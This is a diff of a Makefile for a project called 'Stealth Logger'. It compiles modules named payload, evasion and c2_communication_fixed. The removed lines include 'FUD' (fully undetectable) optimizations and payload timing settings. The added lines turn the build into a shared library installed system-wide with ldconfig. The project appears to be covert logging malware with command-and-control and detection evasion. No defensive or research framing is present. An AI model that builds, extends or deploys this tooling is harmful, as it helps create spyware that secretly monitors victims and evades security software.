@@ -1,39 +1,28 @@
+# Stealth Logger Makefile
 CC = gcc
-CFLAGS = -Wall -Wextra -O2 -fPIC -fvisibility=hidden -s -ffunction-sections -fdata-sections -Wl,--gc-sections -Wl,--strip-all
-LDFLAGS = -ldl -lpthread
+CFLAGS = -Wall -Wextra -O2 -fPIC -DPIC
+LDFLAGS = -shared -ldl
 
-# Payload configuration
-PAYLOAD_TYPE ?= 1
-PAYLOAD_INTERVAL ?= 60
-PAYLOAD_DURATION ?= 300
+all: libstealthlogger.so
 
-# FUD optimizations
-CFLAGS += -DPAYLOAD_TYPE=$(PAYLOAD_TYPE)
-CFLAGS += -DPAYLOAD_INTERVAL=$(PAYLOAD_INTERVAL)
-CFLAGS += -DPAYLOAD_DURATION=$(PAYLOAD_DURATION)
+libstealthlogger.so: main.o payload.o evasion.o c2_communication_fixed.o
+	$(CC) $(LDFLAGS) -o $@ $^
 
-# Source files
-SRCS = main.c payload.c evasion.c c2_communication_fixed.c
-OBJS = $(SRCS:.c=.o)
+main.o: main.c payload.h evasion.h c2_communication_fixed.h config.h
+	$(CC) $(CFLAGS) -c -o $@ $<
 
-# Target executable
-TARGET = stealth_logger
+payload.o: payload.c payload.h payload_config.h
+	$(CC) $(CFLAGS) -c -o $@ $<
 
-all: $(TARGET)
+evasion.o: evasion.c evasion.h config.h
+	$(CC) $(CFLAGS) -c -o $@ $<
 
-$(TARGET): $(OBJS)
-	$(CC) $(CFLAGS) -o $@ $^ $(LDFLAGS)
-
-%.o: %.c
+c2_communication_fixed.o: c2_communication_fixed.c c2_communication_fixed.h config.h
 	$(CC) $(CFLAGS) -c -o $@ $<
 
 clean:
-	rm -f $(TARGET) $(OBJS)
+	rm -f *.o libstealthlogger.so
 
-install: $(TARGET)
-	cp $(TARGET) /usr/local/bin/
-
-uninstall:
-	rm -f /usr/local/bin/$(TARGET)
-
-.PHONY: all clean install uninstall
+install:
+	cp libstealthlogger.so /usr/local/lib
+	ldconfig
